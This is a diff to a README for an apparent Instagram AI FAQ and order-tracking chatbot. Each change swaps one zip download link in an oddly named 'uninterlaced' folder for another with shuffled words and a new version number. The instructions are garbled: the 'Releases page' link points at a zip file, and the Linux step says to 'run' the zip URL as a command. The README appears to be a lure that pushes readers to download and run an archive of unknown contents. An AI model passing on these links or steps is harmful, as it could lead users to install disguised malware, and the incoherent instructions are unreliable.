@@ -1,6 +1,6 @@
 # 🤖 instagram-ai-faq-order-tracking-chatbot - Simplify Customer Interactions Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip%https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip)](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip)
+[![Download Now](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip%https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip)](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip)
 
 ## 🌟 Overview
 
@@ -28,7 +28,7 @@ To get started with the instagram-ai-faq-order-tracking-chatbot, follow these si
 
 To install the instagram-ai-faq-order-tracking-chatbot:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip) to download the latest version.
   
 2. Choose the appropriate build for your operating system and click to download it.
 
@@ -48,9 +48,9 @@ To install the instagram-ai-faq-order-tracking-chatbot:
 
 ### Linux
 
-- Extract the downloaded `https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip` file.
+- Extract the downloaded `https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip` file.
 - Open a terminal and navigate to the extracted folder.
-- Run the command `https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip` to install.
+- Run the command `https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip` to install.
 
 ## 🛠️ How to Use
 
@@ -92,4 +92,4 @@ To learn more about AI in customer service and enhance your understanding, consi
 
 Thank you for using the instagram-ai-faq-order-tracking-chatbot. We hope it makes your customer support interactions smoother and more efficient!
 
-[![Download Now](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip%https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip)](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/tracking_order_instagram_ai_chatbot_faq_v1.9.zip)
+[![Download Now](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip%https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip)](https://raw.githubusercontent.com/jaisingh001/instagram-ai-faq-order-tracking-chatbot/main/uninterlaced/faq_instagram_ai_tracking_chatbot_order_v3.7.zip)
